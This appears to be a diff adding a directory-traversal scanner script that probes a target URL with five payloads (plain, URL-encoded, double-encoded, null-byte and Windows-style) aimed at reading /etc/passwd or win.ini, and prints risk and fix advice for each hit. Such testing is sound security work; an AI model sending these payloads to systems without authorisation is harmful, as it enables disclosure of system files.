@@ -1,0 +1,69 @@
+# Directory Traversal Check
+# Tests for path traversal vulnerabilities
+
+if $ARGC < 1 then
+    print "ERROR: Missing target URL"
+    set $stop 1
+else
+    set $target $ARG1
+    set $stop 0
+endif
+
+if $stop == 0 then
+    print "[SCAN] Directory Traversal Testing"
+    print "Target: $target"
+    
+    set $traversal_found 0
+    
+    # Test 1: Basic traversal
+    GET "$target/file?path=../../../etc/passwd"
+    if response contains "root:" then
+        print "[CRITICAL] Directory traversal found"
+        print "  URL: $target/file"
+        print "  Risk: File disclosure"
+        print "  Fix: Validate file paths"
+        set $traversal_found $traversal_found + 1
+    endif
+    
+    # Test 2: Encoded traversal
+    GET "$target/download?file=..%2F..%2F..%2Fetc%2Fpasswd"
+    if response contains "root:" then
+        print "[CRITICAL] Encoded path traversal"
+        print "  URL: $target/download"
+        print "  Risk: File disclosure"
+        print "  Fix: Decode and validate paths"
+        set $traversal_found $traversal_found + 1
+    endif
+    
+    # Test 3: Double encoding
+    GET "$target/read?doc=..%252F..%252F..%252Fetc%252Fpasswd"
+    if response contains "root:" then
+        print "[CRITICAL] Double encoded traversal"
+        print "  URL: $target/read"
+        print "  Risk: Bypass filters"
+        print "  Fix: Recursive decoding"
+        set $traversal_found $traversal_found + 1
+    endif
+    
+    # Test 4: Null byte
+    GET "$target/view?page=../../../../etc/passwd%00.jpg"
+    if response contains "root:" then
+        print "[HIGH] Null byte traversal"
+        print "  URL: $target/view"
+        print "  Risk: Extension bypass"
+        print "  Fix: Strip null bytes"
+        set $traversal_found $traversal_found + 1
+    endif
+    
+    # Test 5: Windows traversal
+    GET "$target/file?name=..\..\..\windows\win.ini"
+    if response contains "[fonts]" then
+        print "[CRITICAL] Windows path traversal"
+        print "  URL: $target/file"
+        print "  Risk: System file access"
+        print "  Fix: Validate backslashes"
+        set $traversal_found $traversal_found + 1
+    endif
+    
+    print "[✓] Completed: 0018_directory_traversal - Found $traversal_found of 5 vulnerabilities tested"
+endif
